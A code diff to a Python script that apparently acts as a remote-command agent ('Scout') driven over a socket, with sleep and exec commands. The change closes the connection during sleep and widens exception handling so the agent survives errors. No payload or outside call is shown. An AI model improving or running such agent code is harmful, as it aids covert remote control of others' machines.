@@ -218,7 +218,10 @@ def main():
                         s.sendall('[-]Please specify an integer as the sleep duration' + End)
                         continue
                     s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
-                    sleep(sleep_time)
+                    s.shutdown(1)
+                    s.close()
+                    for i in range(sleep_time):
+                        sleep(1)
                     break
                 elif command == 'exec':
                     try:
@@ -271,10 +274,13 @@ def main():
                 else:
                     s.sendall('[-]Unknown command "' + command + '", run "help" for help menu'+End)
             except (socket.error, socket.timeout):
-                s.shutdown(1)
-                s.close()
-                break
-            except IndexError:#Exception as e:
+                try:
+                    s.shutdown(1)
+                    s.close()
+                    break
+                except socket.error:
+                    break
+            except Exception as e:
                 try:
                     if command:
                         s.sendall('[-]Error, last run command : ' + command + '. Error message : ' + str(e) + End)
